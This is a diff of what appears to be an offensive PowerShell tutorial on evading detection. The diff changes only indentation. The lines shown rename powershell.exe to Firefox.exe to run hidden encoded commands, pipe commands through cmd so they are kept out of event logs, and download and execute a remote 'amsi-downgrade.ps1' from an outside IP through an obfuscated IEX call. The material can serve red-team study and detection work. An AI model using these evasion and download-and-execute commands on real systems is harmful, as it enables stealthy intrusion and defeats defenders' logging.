@@ -719,8 +719,8 @@ Here we can view the all process of encoding/decoding in powershell console
           rename it to Firefox.exe using an agent.bat before further ahead call the obfuscated
           powershell binary (Firefox.exe) to execute our powershell command line arguments.
 
-       Copy-Item "$env:windir\System32\Windowspowershell\v1.0\powershell.exe" -Destination "$env:tmp\Firefox.exe"
-       cd $env:tmp; .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
+      Copy-Item "$env:windir\System32\Windowspowershell\v1.0\powershell.exe" -Destination "$env:tmp\Firefox.exe"
+      cd $env:tmp; .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
 
 ![powershell rename](http://i63.tinypic.com/k0rhnt.jpg)
 
@@ -730,8 +730,8 @@ Here we can view the all process of encoding/decoding in powershell console
           the ability of powershell to consume commands from the standart input stream ( pipe | )
           When viewed in the event log, the arguments to powershell.exe are no longer visible.
 
-        cmd.exe /c "echo Get-ExecutionPolicy -List" | powershell.exe
-        cmd.exe /c "set var=Get-ExecutionPolicy -List&& cmd.exe /c echo %var%^" | powershell.exe
+      cmd.exe /c "echo Get-ExecutionPolicy -List" | powershell.exe
+      cmd.exe /c "set var=Get-ExecutionPolicy -List&& cmd.exe /c echo %var%^" | powershell.exe
 
 ![powershell rename](http://i67.tinypic.com/in8keu.jpg)
 
@@ -746,16 +746,16 @@ Here we can view the all process of encoding/decoding in powershell console
            into 'strings' that can deal with that limitation, allowing us to call the statement
            IEX previous stored inside a local powershell variable .. 
            
-        [The conventional way]
-        $obf="iex"
-        $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
-        powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
-        Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+      [The conventional way]
+      $obf="iex"
+      $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+      powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+      Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
 
 ![var declaration fail](http://i66.tinypic.com/6jn238.jpg)
 
-        [Using Invoke-Command statement wrapped in double quotes]
-        powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"
+      [Using Invoke-Command statement wrapped in double quotes]
+      powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"
 
 ![var declaration success](http://i65.tinypic.com/2hx85g3.jpg)
 
